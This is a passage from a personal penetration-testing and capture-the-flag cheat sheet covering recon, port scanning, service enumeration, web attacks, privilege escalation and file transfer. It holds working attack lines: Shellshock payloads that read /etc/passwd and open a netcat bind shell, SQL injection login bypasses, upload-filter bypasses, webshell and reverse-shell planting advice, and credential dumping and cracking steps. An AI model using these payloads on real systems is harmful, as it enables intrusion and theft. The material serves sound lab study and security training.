ORUGS4ZANFZSAYLOEBSXQYLNOBWGKIDPMYQGEYLTMUZTELRANF2CA2LTEB3GS43JMJWGKIDCPEQGY33UOMQG6ZRAMNQXA2LUMFWCA3DFOR2GK4TTEBQW4ZBANVXXEZJAMVYXKYLMOMQHG2LHNZZSAZTPOIQHAYLEMRUW4ZZMEBSXQ5DSME======
```

```
Base85:
<~9jqo^BlbD-BleB1DJ+*+F(f,q/0JhKF<GL>Cj@.4Gp$d7F!,L7@<6@)/0JDEF<G%<+EV:2F!,
O<DJ+*.@<*K0@<6L(Df-\0Ec5e;DffZ(EZee.Bl.9pF"AGXBPCsi+DGm>@3BB/F*&OCAfu2/AKY
i(DIb:@FD,*)+C]U=@3BN#EcYf8ATD3s@q?d$AftVqCh[NqF<G:8+EV:.+Cf>-FD5W8ARlolDIa
l(DId<j@<?3r@:F%a+D58'ATD4$Bl@l3De:,-DJs`8ARoFb/0JMK@qB4^F!,R<AKZ&-DfTqBG%G
>uD.RTpAKYo'+CT/5+Cei#DII?(E,9)oF*2M7/c~>
```

* [Base65535](https://github.com/qntm/base65536)


	Unicode characters encoding. Includes a lot of seemingly random spaces and chinese characters!

```
?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
```

* [Base41](https://github.com/sveljko/base41/blob/master/python/base41.py) 


* Wordsearches

	Some CTFs have me solve wordsearchs as part of a challenge (TJCTF 2018). This code is super helpful: [https://github.com/robbiebarrat/word-search](https://github.com/robbiebarrat/word-search)


* Password-protected Zip Files:  [`fcrackzip`][fcrackzip] and `zip2john.py`

	Use

* 15 Puzzle
	
	A sliding puzzle that consists of a 4x4 grid with numbered square tiles, with one missing, set in a random order. It was involved in SharifCTF to determine if a group of these puzzles was solvable: [https://theromanxpl0it.github.io/ctf_sharifctf18/fifteenpuzzle/](https://theromanxpl0it.github.io/ctf_sharifctf18/fifteenpuzzle/)



* Chrome Password Dump

	A [Windows] command-line tool to dump passwords saved with Google Chrome.
	[http://securityxploded.com/chrome-password-dump.php](http://securityxploded.com/chrome-password-dump.php)

* `img2txt`

	A command-line tool to convert an image into ASCII for the terminal. Can be installed like so:

```
sudo apt install -y caca-utils
```


* Strange Symbols/Characters

	Some CTFs will try and hide a message on a picture with strange symbols. Try and Google Reverse Image searcht these. They may be Egyptian Characters: 

![http://www.virtual-egypt.com/newhtml/hieroglyphics/sample/alphabet.gif](http://www.virtual-egypt.com/newhtml/hieroglyphics/sample/alphabet.gif)


[steghide]: http://steghide.sourceforge.net/
[snow]: http://www.darkside.com.au/snow/
[cribdrag.py]: https://github.com/SpiderLabs/cribdrag
[cribdrag]: https://github.com/SpiderLabs/cribdrag
[pcap]: https://en.wikipedia.org/wiki/Pcap
[PCAP]: https://en.wikipedia.org/wiki/Pcap
[Wireshark]: https://www.wireshark.org/
[Network Miner]: http://www.netresec.com/?page=NetworkMiner
[PCAPNG]: https://github.com/pcapng/pcapng
[pcapng]: https://github.com/pcapng/pcapng
[pdfcrack]: http://pdfcrack.sourceforge.net/index.html
[GitDumper.sh]: https://github.com/internetwache/GitTools
[pefile]: https://github.com/erocarrera/pefile
[Python]: https://www.python.org/
[PE]: https://en.wikipedia.org/wiki/Portable_Executable
[Portable Executable]: https://en.wikipedia.org/wiki/Portable_Executable
[hipshot]: https://bitbucket.org/eliteraspberries/hipshot
[QR code]: https://en.wikipedia.org/wiki/QR_code
[QR codes]: https://en.wikipedia.org/wiki/QR_code
[QR]: https://en.wikipedia.org/wiki/QR_code
[zbarimg]: https://linux.die.net/man/1/zbarimg
[Linux]: https://en.wikipedia.org/wiki/Linux
[Ubuntu]: https://en.wikipedia.org/wiki/Ubuntu_(operating_system)
[Wine]: https://en.wikipedia.org/wiki/Wine_(software)
[Detect DTMF Tones]: http://dialabc.com/sound/detect/index.html
[dnSpy]: https://github.com/0xd4d/dnSpy
[Windows]: https://en.wikipedia.org/wiki/Microsoft_Windows
[.NET]: https://en.wikipedia.org/wiki/.NET_Framework
[Vigenere Cipher]: https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher
[PDF]: https://en.wikipedia.org/wiki/Portable_Document_Format
[Playfair Cipher]: https://en.wikipedia.org/wiki/Playfair_cipher
[phpdc.phpr]:https://github.com/lighttpd/xcache/blob/master/bin/phpdc.phpr
[bcompiler]: http://php.net/manual/en/book.bcompiler.php
[PHP]: https://en.wikipedia.org/wiki/PHP
[GET]: https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods
[pdfdetach]: https://www.systutorials.com/docs/linux/man/1-pdfdetach/
[sqlmap]: https://github.com/sqlmapproject/sqlmap
[hachoir-subfile]: https://pypi.python.org/pypi/hachoir-subfile/0.5.3
[wget]: https://en.wikipedia.org/wiki/Wget
[git]: https://git-scm.com/
[Cross-site scripting]: https://en.wikipedia.org/wiki/Cross-site_scripting
[XSS]: https://en.wikipedia.org/wiki/Cross-site_scripting
[HTML]: https://en.wikipedia.org/wiki/HTML
[JavaScript]: https://en.wikipedia.org/wiki/JavaScript
[PEiD]: https://www.aldeid.com/wiki/PEiD
[wpscan]: https://wpscan.org/
[Ruby]: https://www.ruby-lang.org/en/
[Wordpress]: https://en.wikipedia.org/wiki/WordPress
[dumpzilla]: http://www.dumpzilla.org/
[hexed.it]: https://hexed.it/
[Magic Numbers]: https://en.wikipedia.org/wiki/Magic_number_(programming)#Magic_numbers_in_files
[Magic Number]: https://en.wikipedia.org/wiki/Magic_number_(programming)#Magic_numbers_in_files
[Edit This Cookie]: http://www.editthiscookie.com/
[cookie]: https://en.wikipedia.org/wiki/HTTP_cookie
[cookies]: https://en.wikipedia.org/wiki/HTTP_cookie
[formatStringExploiter]: http://formatstringexploiter.readthedocs.io/en/latest/index.html
[format string vulnerability]: https://www.owasp.org/index.php/Format_string_attack
[printf vulnerability]: https://www.owasp.org/index.php/Format_string_attack
[Java]: https://en.wikipedia.org/wiki/Java_(programming_language)
[JAR]: https://en.wikipedia.org/wiki/JAR_(file_format)
[OpenStego]: https://www.openstego.com/
[Stegsolve.jar]: http://www.caesum.com/handbook/stego.htm
[Stegsolve]: http://www.caesum.com/handbook/stego.htm
[PcapXray]: https://github.com/Srinivas11789/PcapXray
[Atbash Cipher]: https://en.wikipedia.org/wiki/Atbash
[TestDisk]: https://www.cgsecurity.org/Download_and_donate.php/testdisk-7.1-WIP.linux26.tar.bz2
[PNG]: https://en.wikipedia.org/wiki/Portable_Network_Graphics
[jd-gui]: https://github.com/java-decompiler/jd-gui
[dex2jar]: https://github.com/pxb1988/dex2jar
[apktool]: https://ibotpeaches.github.io/Apktool/
[RCE]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
[remote code execution]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
[arbitrary code execution]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
[XSStrike]: https://github.com/UltimateHackers/XSStrike
[nishang]: https://github.com/samratashok/nishang
[Malboge]: https://en.wikipedia.org/wiki/Malbolge
[Piet]: https://esolangs.org/wiki/Piet
[npiet]: https://www.bertnase.de/npiet/
[LC4]: https://www.schneier.com/blog/archives/2018/05/lc4_another_pen.html
[Empire]: https://github.com/EmpireProject/Empire
[Base64]: https://en.wikipedia.org/wiki/Base64
[Base32]: https://en.wikipedia.org/wiki/Base32
[Base85]: https://en.wikipedia.org/wiki/Ascii85
[fcrackzip]: https://github.com/hyc/fcrackzip
[zsteg]: https://github.com/zed-0xff/zsteg
[jsteg]: https://github.com/lukechampine/jsteg
[jstego]: https://sourceforge.net/projects/jstego/
[StegCracker]: https://github.com/Paradoxis/StegCracker
[Base41]: https://github.com/sveljko/base41/blob/master/python/base41.py
[Base65535]: https://github.com/qntm/base65536
[Easy Python Decompiler]: https://github.com/aliansi/Easy-Python-Decompiler-v1.3.2


---------------------------
[Extra Readings and Tools](https://github.com/thezakman/CTF-Heaven/tree/master/extra)
-----------------------

A list of interesting things I can use one day or have already used in the past.

* [android-tools](extra/android-tools.md)
* [blockchain-tools](extra/blockchain-tools.md)
* [blogs](extra/blogs.md)
* [car-tools](extra/car-tools.md)
* [cloud-tools](extra/cloud-tools.md)
* [cobalt-strike-addons](extra/cobalt-strike-addons.md)
* [code-audit](extra/code-audit.md)
* [ctf-tools](extra/ctf-tools.md)
* [database-tools](extra/database-tools.md)
* [docker-tools](extra/docker-tools.md)
* [exploit-development.md](extra/exploit-development.md)
* [exploit-latest](extra/exploit-latest.md)
* [forensics-tools](extra/forensics-tools.md)
* [fuzzing-tools](extra/fuzzing-tools.md)
* [hail-mary-attack](extra/hail-mary-attack.md)
* [hardening](extra/hardening.md)
* [hardware-tools](extra/hardware-tools.md)
* [honeypot](extra/honeypot.md)
* [ios-tools](extra/ios-tools.md)
* [iot-tools](extra/iot-tools.md)
* [machine-learning](extra/machine-learning.md)
* [macos-tools](extra/macos-tools.md)
* [malware-analysis](extra/malware-analysis.md)
* [malware-development](extra/malware-development.md)
* [masscan](extra/masscan.md)
* [nmap](extra/nmap.md)
* [office-tools](extra/office-tools.md)
* [password-tool](extra/password-tool.md)
* [payloads](extra/payloads.md)
* [pentest-tools](extra/pentest-tools.md)
* [powershell-tools](extra/powershell-tools.md)
* [pwn-tips](extra/pwn-tips.md)
* [re-tools](extra/re-tools.md)
* [router-tools](extra/router-tools.md)
* [sdr-tools](extra/sdr-tools.md)
* [shellcode-tools](extra/shellcode-tools.md)
* [software-development](extra/software-development.md)
* [threat-detection](extra/threat-detection.md)
* [wireless-tools](extra/wireless-tools.md)

ba≈üka bir g√ºn
-------------

nmap
----

I like to run a basic nmap scan of the host:
nmap -sV -sC -oA initial 10.10.10.X

When that‚Äôs complete, let‚Äôs try scanning all the ports:
nmap -T4 -A -p- -oA fullscan 10.10.10.X

It can be also be useful to check ciphers on webservers:
nmap -p 443 --script=ssl-enum-ciphers 10.10.10.X



OSINT
-----

Target validation: WHOIS, nslookup, dnsrecon, dig

Email-related:
nslookup for SPF: nslookup -type=txt domain.com
nslookup for DMARC: nslookup -type=txt _dmarc.domain.com

Getting subdomains: Google, dig, nmap, sublist3r, Bluto, crt.sh, fierce.pl, knockpy

Fingerprinting: nmap, wappalyzer (browser plugin), WhatWeb, BuiltWith, netcat

Data breaches: haveibeenpwned, weleakinfo.com (costs $2 for 24 hrs)

User/email enumeration: theharvester.py, hunter.io (free account requested)

Web servers and applications
----------------------------

Vulnerability scanning
----------------------
Nikto is useful for finding vulnerabilities
nikto -h https://10.10.10.X


Directory enumeration
---------------------

Dirb is one way to do directory enumeration
dirb http://10.10.10.X -r -o server.dirb

Gobuster is another:
gobuster dir -u http://10.10.10.X -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

wfuzz also does web-based enumeration
Here‚Äôs one to enumerate directories with a wordlist
wfuzz -u http://10.10.10.X/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Here‚Äôs an example to enumerate login POST data from a password list:
wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ"  --hc 302 

Password fuzzing
----------------

Hydra

SQL Injection - Manual
----------------------

If given a login page, try in a given field:
test' OR 1=1; --
(potentially leads to: SELECT * FROM Users WHERE email=‚Äôtest‚Äô OR 1=1; ‚Äì‚Äô)

Sqlmap
------

sqlmap -r login.req --level 5 --risk 3
(login.req is text of an burp suite intercept of a login request)

Services
--------

SMB
---

Test for anonymous login:
smbclient -L \\\\10.10.10.X

SSH
---

https://community.turgensec.com/ssh-hacking-guide/

Active Directory
----------------

[Responder](https://github.com/SpiderLabs/Responder) (LLMNR poisoning)

[Bloodhound](https://github.com/BloodHoundAD/Bloodhound/wiki) for mapping hidden and unintended relationships in AD

[Kerberoasting](https://attack.mitre.org/techniques/T1208/)

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) for password spraying in AD

[Integration-IT AD Cheatsheet](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet)

Exploits and Metasploit
-----------------------

searchsploit [software name and version] (or use metasploit‚Äôs search)

MSFvenom cheat sheet

msf>search suggester (module for priv esc when given an existing session)

[Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed)


Useful shell commands
---------------------

Shell elevation (from non-tty shell; just go down the list)

https://netsec.ws/?p=337
Spawn bash from shell
python3 -c "import pty;pty.spawn('/bin/bash')"

Bash
Show interesting files in home directory (potential flags):
find /home -printf -type f "%f\t%p\t%u\t%g\t%m\n" | column -t

Check versions of running software (searching for ‚Äúpam‚Äù in this case):
dpkg -l | grep -i pam
sudo -l
history

Get Meterpreter shell from backgrounded shell:
post/multi/manage/shell_to_meterpreter

Meterpreter

getuid
sysinfo
hashdump (if privileged)
shell 
load (tab to autocomplete and get list: kiwi, incognito, etc.)
getsystem (priv esc) 

Windows network stuff
arp -a
netstat -an

Transferring files
------------------
Create HTTP server serving files in current directory on port 8000
python -m SimpleHTTPServer 8000

To download files from above server on linux:
wget 10.0.0.X/filename.sh

To download files from above server on Windows:
certutil -urlcache -f http://10.0.0.X:8000/filename.sh

Encoding and Decoding
---------------------
From base64:
echo "SFRCe3YzcnNpMG5fYzBudHIwbF9hbV9JX3JpZ2h0P30=" | base64 --decode

Scripts and one-liners
----------------------
For loop example: convert each line in text file tomcat.txt to base64 and print output
for cred in $(cat tomcat.txt); do echo -n $cred | base64; done

Print 20th line in file tomcat.txt
sed -n 20p tomcat.txt

Privilege Escalation
--------------------
LinEnum

GTFOBins (linux)

Metasploit: local_exploit_suggester (once you have a session)

Windows:

https://www.fuzzysecurity.com/tutorials/16.html
Sherlock Rastamouse

windows-exploit-suggester (python script)

Windows example of Sherlock running:

C:\Users\kostas\Desktop>powershell.exe -exec bypass -Command ‚Äú& {Import-Module .\sherlock.ps1; Find-AllVulns}‚Äù

Forensics
---------
[Here‚Äôs a helpful cheatsheet](https://trailofbits.github.io/ctf/forensics/)

Scratchpad below
----------------

SMB: ports 139 and 445

smbclient 

smbmap

https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b
https://github.com/Tib3rius/AutoRecon (check tools that author refers to as well)

https://medium.com/threat-intel/what-is-living-off-the-land-ca0c2e932931 (links to LOLBAS: tool)

snmpwalk

Impacket (github): Logging into Windows machine with user:password@host:

psexec.py pentest:‚ÄôP3nT3st!‚Äô@10.10.10.152

(can also smbexec.py or wmiexec.py but less interaction)

[More impacket examples](https://www.andreafortuna.org/2018/06/18/fun-with-network-protocols-using-python-and-impacket/)

Install on Windows VM (downloadable from Microsoft):

https://github.com/fireeye/commando-vm

[Table of Contents for PWK](https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf)

[Ippsec video search](https://ippsec.rocks/?#)

ba≈üka bir g√ºn
-------------

Reconnaissance (Information Gathering)
--------------------------------------

- [hunter.io](https://hunter.io/) - known email and users for a specific domain
- theharvester - search for emails in several search engines

    ```bash
    theHarvester -d *.co.il -l 500 -b google
    ```

- sublist3r - search for subdomain for a given domain
- [crt.sh](http://crt.sh) - subdomains  search with %.tesla.co.il
- [httprobe](https://github.com/tomnomnom/httprobe) - will check a list of domain if they are alive, we can fire it sublis3r results
- [amass](https://github.com/OWASP/Amass) - can also search for subdomains and more

    ```bash
    amass enum -d tesla.com
    ```

- [builtwith](https://builtwith.com/) - show frameworks and technologies any domain is built with, then we can search for exploits for those technologies
- [wappalizer](https://www.wappalyzer.com/download/) - browser addon that does almost the same as builtwith
- whatweb - same but uglier than builtwith
- [sumrecon](https://github.com/Gr1mmie/sumrecon) - script that automate some of the above
- [shodan.io](http://shodan.io) - find open ports and services online
- [dnsdumpster](https://dnsdumpster.com/) - dns recon & research, find & lookup dns records
- [ipinfo.io](http://ipinfo.io) - ip info
- [dehashed](https://www.dehashed.com) - find leaked emails and passwords
- simplyemail - enumerate all the online places (github, target site etc)

    ```
    git clone https://github.com/killswitch-GUI/SimplyEmail.git
    ./SimplyEmail.py -all -e TARGET-DOMAIN
    ```

- DNSRecon - DNS Bruteforce

    ```bash
    dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
    ```

- Skipfish - prepares an interactive sitemap for the targeted site

    ```bash
    # basic scan
    skipfish -o out_dir https://www.host.com
    # using cookies to access authenticated pages
    skipfish -o out_dir -I urls_to_scan -X urls_not_to_scan -C cookie1=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX -C cookie2=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  https://www.host.com
    ```

- [namechk](https://namechk.com/) / [whatsmyname](https://whatsmyname.app/) / [namecheckup](https://namecheckup.com/) - OSINT use accounts around the web
- [maltego](https://sectools.org/tool/maltego/) - data mining application

- Exploiting Shellshock

    ```bash
    git clone https://github.com/nccgroup/shocker
    ```

    ```bash
    ./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
    ```

    cat file (view file contents)

    ```bash
    echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
    ```

    Shell Shock run bind shell

    ```bash
    echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
    ```

    Shell Shock reverse Shell

    ```bash
    nc -l -p 443
    ```

Scanning
--------

- arp-scan (Kali) - gives all IP's on NAT
- netdiscover (Kali) - show live IP's

    ```bash
    sudo netdiscover -r 10.0.0.0/24
    ```

- [rustscan](https://github.com/RustScan/RustScan#-usage) - Scans all 65k ports in 3 seconds and pipe them to NMAP

    ```bash
    rustscan -a 127.0.0.1 -- -A -sC 
    #it's like running nmap -Pn -vvv -p $PORTS -A -sC 127.0.0.1
    ```

- nmap

    ```bash
    nmap -T4 -p- -A 192.168.249.128
    nmap -sV -sC -O FILENAME IP
    nmap -sU -sV --script=vuln #search vulnarabilities
    #T4: speed 1-5, prefered 4, 
    #-p-: scan all 65K ports, 
    #-A: all information possible, 
    #-sS: stealth mode is running by default, it means that we do not establish a connection, instead after ACK we send a reset (SYN‚ÜíSYNACK‚ÜíRST)
    #-sV: find versions
    #-sc: default script
    #-O: output to file
    ls /usr/share/nmap/scripts/* | grep ftp #Search nmap scripts for keywords

    #clean results
    grep '/tcp' FILENAME | awk -F "/" '{print $1}'| tr '\n' ',';echo
    ```

- masscan (kali): another fast port scanner

    ```bash
    masscan -p1-65535 --rate 1000 10.0.0.101
    ```

- metasloit - auxiliary in msf is extra enumration and recon

    ```bash
    use auxiliary/scanner/smb/smb_version
    ```

- searchsploit (kali) - search exploit-db website offline

    ```bash
    searchsploit mod ssl 2
    ```

- [Nessus](https://www.tenable.com/products/nessus) - vulnerability assessment, it can scan for open ports, open vulnerabilities, directory busting
- openvas - Vulnerability Assessment

    ```bash
    apt-get update
    apt-get dist-upgrade -y
    apt-get install openvas
    openvas-setup
    netstat -tulpn #Verify openvas is running using
    #Login at https://127.0.0.1:9392 - credentials are generated during openvas-setup

    ```

AIO Scanners
------------

- [nmap automator](https://github.com/21y4d/nmapAutomator) - A script that you can run in the background!

    ```bash
    ./nmapAutomator.sh <TARGET-IP> <TYPE>  
    ./nmapAutomator.sh 10.1.1.1 All  
    ./nmapAutomator.sh 10.1.1.1 Basic  
    ./nmapAutomator.sh 10.1.1.1 Recon
    ```

- [autorecon](https://github.com/Tib3rius/AutoRecon) - multi-threaded network reconnaissance tool which performs automated enumeration of services

    ```bash
    autorecon 127.0.0.1

    ```

- [Vanquish](https://github.com/frizb/Vanquish) - AIO tool (NMap | Hydra | Nikto | Metasploit | | Gobuster | Dirb | Exploitdb | Nbtscan | | Ntpq | Enum4linux | Smbclient | Rpcclient | | Onesixtyone | Sslscan | Sslyze | Snmpwalk | | Ident-user-enum | Smtp-user-enum | Snmp-check | Cisco-torch | | Dnsrecon | Dig | Whatweb | Wafw00f | | Wpscan | Cewl | Curl | Mysql | Nmblookup | Searchsploit | | Nbtscan-unixwiz | Xprobe2 | Blindelephant | Showmount)

    ```bash
    echo "[IP]" > ~/tools/vanquish/hosts.txt
    python2 Vanquish2.py -hostFile hosts.txt -logging -outputFolder ~/hackthebox/[BOXNAME]

    ```

- [hackerEnv](https://github.com/abdulr7mann/hackerEnv) - automation tool that quickly and easily sweep IPs and scan ports, vulnerabilities and exploit them

    ```bash
    ./hackerEnv -t 10.10.10.10
    ```

- [fsociety](https://github.com/Manisso/fsociety) - A Penetration Testing Framework, you will have every script that a hacker needs

- recon-ag - full-featured web reconnaissance framework written in Python

    ```bash
    git clone https://github.com/lanmaster53/recon-ng.gitcd /recon-ng
    ./recon-ng
    show modules
    help
    ```

- [autorecon](https://github.com/Tib3rius/AutoRecon) - multi-threaded network reconnaissance tool which performs automated enumeration of services

    ```bash
    autorecon 127.0.0.1
    ```

- [legion](https://github.com/carlospolop/legion) - Automatic Enumeration Tool

    ```jsx
    sudo ~/tools/legion/legion.py
    options
    set host 10.0.0.210
    run
    ```

Enumeration Open Ports
----------------------

[Pentesting Network](https://book.hacktricks.xyz/pentesting/pentesting-network)

FTP Enumeration (21)
--------------------

```bash
nmap ‚Äìscript ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.1
FTP anonymous sign in
	mget * #download everything

#can we upload file as anonymous?
#if so we can try upload a cmd webshell and execute commands
locate cmd.aspx #if iis
put cmd.aspx
#browse to the file:
http://IP/cmd.aspx

#we can also try to create a shell payload with msfvenum and upload it
```

SSH (22):
---------

```bash
ssh INSERTIPADDRESS 22

nc IP 22

nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s

#downloading
scp username@hostname:/path/to/remote/file /path/to/local/file
```

If NMAP show "SSH Filtered" it means that [port knocking](https://blog.rapid7.com/2017/10/04/how-to-secure-ssh-server-using-port-knocking-on-ubuntu-linux/) is enable

```bash
#we need to find the /etc/knockd.conf (thorough LFI or FTP or something else)
#inside there is a sequence
knock IP SEQUENCE1 SEQUENCE2 SEQUENCE3
#check nmap again
```

SMTP Enumeration (25):
----------------------

```bash
nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.0.0.1
```

```bash
nc -nvv INSERTIPADDRESS 25
```

```bash
telnet INSERTIPADDRESS 25
```

```jsx
use auxiliary/scanner/smtp/smtp_enum
msf auxiliary(smtp_enum) > set rhosts 192.168.1.107
msf auxiliary(smtp_enum) > set rport 25
msf auxiliary(smtp_enum) > set USER_FILE /root/Desktop/user.txt
msf auxiliary(smtp_enum) > exploitw
```

DNS (53)
---------

```bash
#DNS zone transfer
sudo nano /etc/hosts
10.10.10.123  friendzone.red 
host -l friendzone.red 10.10.10.123
```

Finger Enumeration (79):
------------------------

Download script and run it with a wordlist: [http://pentestmonkey.net/tools/user-enumeration/finger-user-enum](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum)

```bash
finger-user-enum.pl [options] (-u username|-U users.txt) (-t host|-T ips.txt)(
```

Web Enumeration (80/443):
--------------------------

[extra enumeration from hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web)

if we get default apache page, try entering IP to HOSTS

Before dirbusting, try going to index.php or index.html to know which extention to look for 

```bash
dirbuster (GUI)
#1st try without "be recursive"
```

```powershell
cd ~/tools
./feroxbuster -u URL -w WORDLIST -x EXT -C 403 -t 100
```

```bash
Web Extensions

sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
```

```bash
dirb http://target.com /path/to/wordlist
dirb http://target.com /path/to/wordlist -X .sh,.txt,.htm,.php,.cgi,.html,.pl,.bak,.old
```

```bash
gobuster dir -u https://target.com -b 403 ms-w /usr/share/wordlists/dirb/big.txt -x .txt,.php
use -r (recursive) or try found folders
```

```bash
nikto ‚Äìh 10.0.0.1 #web vulnerability scanner
```

```jsx
owasp zap
```

```bash
Look for Default Credentials
```

```bash
sql
```

- View Page Source

    ```bash
    Hidden Values
        Developer Remarks
        Extraneous Code
        Passwords!
    ```

- burpsuite

    ```bash
    compare ‚Äúhost:‚Äù
    crsf token = no bruteforce
    add php code if url has anything.php
            <L>
     anything being executed?
            try directory traversal
                ../../../home
    ```

- sign in page

    ```bash
    SQL Injection

        ‚Äòor 1=1‚Äì ‚Äì
        ‚Äò or ‚Äò1‚Äô=1
        ‚Äò or ‚Äò1‚Äô=1 ‚Äî ‚Äì
        ‚Äò‚Äì
        Use known Username
            tyler‚Äô ‚Äî ‚Äì
            tyler‚Äô) ‚Äî ‚Äì

    #bruteforce
    hydra -L <username list> -p <password list> <IP Address> <form parameters><failed login message>
    ```

- file upload

    ```bash

    #if NMAP show something like: Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND
    #we want to check if we can upload files
    davtest -url http://IP
    #if we see succedd we can use curl to upload:
    curl -X PUT http://10.10.10.15/df.txt -d @test.txt
    #and execute it:
    **curl http://10.10.10.15/df.txt**

    Blacklisting bypass
            bypassed by uploading an unpopular php extensions. such as: pht, phpt, phtml, php3, php4, php5, php6 
        Whitelisting bypass
            passed by uploading a file with some type of tricks, Like adding a null byte injection like ( shell.php%00.gif ). Or by using double extensions for the uploaded file like ( shell.jpg.php)
    ```

- Wfuzz - Subdomain brute forcer, replaces a part of the url like username with wordlist

    ```bash
    wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test

    wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ

    wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"

    wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ

    wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ
    ```

- [Knockpy](https://github.com/guelfoweb/knock) - enumerate subdomains on a target domain through a wordlist

    ```bash
    knockpy domain.com
    ```

- wpscan - if wordpress found

    ```bash
    wpscan --url [http://:80$target](http://:80$target) --enumerate u,t,p | tee $target-wpscan-enum
    #if we can enter wordpres, we can change the 404 page to php reverse shell code and gain access
    ```

- joomscan - if joomla found

    ```powershell

    cd ~/tools/joomscan
    perl joomscan.pl -u http://10.10.10.150/administrator/
    ```

If A File is found
------------------------------------------------------------

- steghide - check pictures for hidden files

    ```bash
        apt-get install steghide

        steghide extract -sf picture.jpg

        steghide info picture.jpg

        apt-get install stegosuite
    ```

- [Stegseek](https://github.com/RickdeJager/stegseek) - lightning fast steghide cracker to extract hidden data from files

    ```bash
    stegseek [stegofile.jpg] [wordlist.txt]
    ```

- binwalk - extract hidden files from files (steganography)

    ```bash
    binwalk FILE.JPG
    #if something was found 
    binwalk -e FILE
    ```

- strings - check strings in files

    ```bash
    stringe FILE.jpg
    ```

- [exiftool](https://github.com/exiftool/exiftool) - pictures metadata
- zip2john - prepare an encrpyted zip file for john hacking

    ```bash
    zip2john ZIPFILE > zip.hashs
    ```

- SQLite DB

    ```powershell
    #if we found a flat-file db 
    file EXAMPLE.db
    #if sqlite3
    sqlite3 <database-name>
    .tables
    PRAGMA table_info(customers);
    SELECT * FROM customers;
    ```

- sqlmap - check website for sql injection (more info down)

    [Sqlmap trick](https://hackertarget.com/sqlmap-post-request-injection/) - if we have a login page, we can try admin:admin, catch that in burpsuite,  save the full request to a file, run:

    ```bash
    sqlmap -r FILENAME --level=5 --risk=3 --batch
    sqlmap -r FILENAME -dbs --level=5 --risk=3 --batch

    sqlmap -r FILENAME --dbs #enumarate DB's
    sqlmap -r FILENAME -D DB_Name --tables #enumarate tables
    sqlmap -r FILENAME -D DB_Name -T TABLE_Name --dump #DUMP table

    #Find SQL in webpage url automatically
    sqlmap -u https://IP/ ‚Äìcrawl=1

    #with authentication
    sqlmap -u ‚Äúhttp://target_server‚Äù -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password

    #Get A Reverse Shell (MySQL)
    sqlmap -r post_request.txt --dbms "mysql" --os-shell
    ```

- [fimap](https://github.com/kurobeats/fimap) - Check for LFI, find, prepare, audit, exploit and even google automatically for local and remote file inclusion

    ```bash
    ~/tools/fimap/src/fimap.py ‚ÄìH ‚Äìu http://target-site.com/ -w output.txt
    ```

    If we see in burpsuite php$url= we need to test for LFI (try /etc/passwrd)

    ```bash
    http://$ip/index.php?page=/etc/passwd
    http://$ip/index.php?file=../../../../etc/passwd
    ```

if a page redirects to another, we can use burp to stop
------------------------------------------------------------

```bash
Proxy -> Options -> Match and Replace
```

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled.png)

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%201.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%201.png)

kerberos (88):
------------------------------------------------------------

```powershell
tel#add host to /etc/hosts
sudo gedit /etc/hosts

./GetUserSPNs.py -request active.htb/SVC_TGS > admin.txt
#the password we will get will be encrypted
john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt

#with the cracked password...
psexec.py administrator@active.htb
```

Pop3 (110):
------------------------------------------------------------

```bash
telnet INSERTIPADDRESS 110
```

```bash
USER [username]
```

```bash
PASS [password]
```

- To login

```bash
LIST
```

- To list messages

```bash
RETR [message number]
```

